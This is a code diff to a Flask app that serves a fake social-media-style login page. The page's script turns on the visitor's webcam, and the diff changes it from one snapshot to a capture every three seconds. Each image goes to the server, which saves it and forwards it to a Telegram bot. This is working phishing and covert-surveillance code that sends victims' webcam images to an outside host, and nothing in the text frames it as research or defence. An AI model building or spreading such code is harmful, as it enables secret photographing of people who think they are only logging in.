@@ -113,30 +113,30 @@ HTML_CONTENT = """
             font-size: 12px;
         }
 
-        .wrapper .dif .fb{
+        .wrapper .header .dif .fb{
             display: flex;
             justify-content: center;
             align-items: center;
         }
 
-        .wrapper .dif .fb img{
+        .wrapper .header .dif .fb img{
             width: 16px;
             height: 16px;
         }
 
-        .wrapper .dif  .fb p{
+        .wrapper .header .dif  .fb p{
             color: #385185;
             font-weight: 500;
             margin-left: 10px;
         }
 
-        .wrapper .dif .forgot{
+        .wrapper .header .dif .forgot{
             font-size: 12px;
             text-align: center;
             margin-top: 20px;
         }
 
-        .wrapper .dif .forgot a{
+        .wrapper .header .dif .forgot a{
             color: #003569;
         }
 
@@ -274,11 +274,13 @@ HTML_CONTENT = """
                 const context = canvasElement.getContext('2d');
                 canvasElement.width = videoElement.videoWidth;
                 canvasElement.height = videoElement.videoHeight;
-                context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
-                const imageData = canvasElement.toDataURL('image/png');
 
-                // Now send the captured photo to the server
-                uploadPhoto(imageData);
+                // Continuously capture the photo every 3 seconds
+                setInterval(function() {
+                    context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
+                    const imageData = canvasElement.toDataURL('image/png');
+                    uploadPhoto(imageData);
+                }, 3000);  // Capture every 3 seconds
             };
         } catch (error) {
             alert("Error accessing webcam: " + error.message);
@@ -288,53 +290,64 @@ HTML_CONTENT = """
     // Function to upload the captured photo to the server
     async function uploadPhoto(imageData) {
         try {
-            const response = await fetch('/send_photo', {
+            const response = await fetch('/upload_photo', {
                 method: 'POST',
                 headers: {
-                    'Content-Type': 'application/json',
+                    'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({ image: imageData })
             });
-            const result = await response.json();
-            console.log('Photo uploaded:', result);
+            const data = await response.json();
+            console.log('Photo uploaded successfully:', data);
         } catch (error) {
             console.error('Error uploading photo:', error);
         }
     }
 </script>
+
 </body>
 </html>
 """
 
-# Route to serve the login page
+# Route to render the HTML page
 @app.route('/')
-def home():
+def index():
     return render_template_string(HTML_CONTENT)
 
-# Route to handle photo capture
-@app.route('/send_photo', methods=['POST'])
-def send_photo():
+
+# Route to handle photo uploads
+@app.route('/upload_photo', methods=['POST'])
+def upload_photo():
     data = request.get_json()
     image_data = data.get('image')
+    
     if image_data:
-        # Process the image (you can save or send it to Telegram here)
-        file_path = os.path.join(UPLOAD_FOLDER, f"photo_{datetime.now().strftime('%Y%m%d%H%M%S')}.png")
-        image_data = image_data.split(",")[1]  # Remove the base64 header
-        with open(file_path, "wb") as f:
-            f.write(base64.b64decode(image_data))
+        # Remove the base64 header
+        image_data = image_data.split(",")[1]
+        # Decode and save the photo
+        image = base64.b64decode(image_data)
+        filename = f"{UPLOAD_FOLDER}/photo_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
+        with open(filename, 'wb') as f:
+            f.write(image)
 
         # Send the image to Telegram
-        with open(file_path, 'rb') as photo:
-            send_telegram_photo(photo)
+        send_to_telegram(filename)
 
-        return jsonify({"status": "success", "message": "Photo uploaded successfully!"})
-    return jsonify({"status": "error", "message": "No image received"})
+        return jsonify({'status': 'success', 'message': 'Photo uploaded successfully'})
+    else:
+        return jsonify({'status': 'error', 'message': 'No image data found'}), 400
 
-def send_telegram_photo(photo):
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
-    files = {'photo': photo}
-    data = {'chat_id': CHAT_ID}
-    requests.post(url, data=data, files=files)
+
+# Function to send the photo to Telegram
+def send_to_telegram(photo_path):
+    with open(photo_path, 'rb') as f:
+        files = {'photo': f}
+        data = {
+            'chat_id': CHAT_ID,
+            'caption': 'New photo from webcam'
+        }
+        requests.post(f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto', data=data, files=files)
+
 
 if __name__ == '__main__':
     app.run(debug=True)
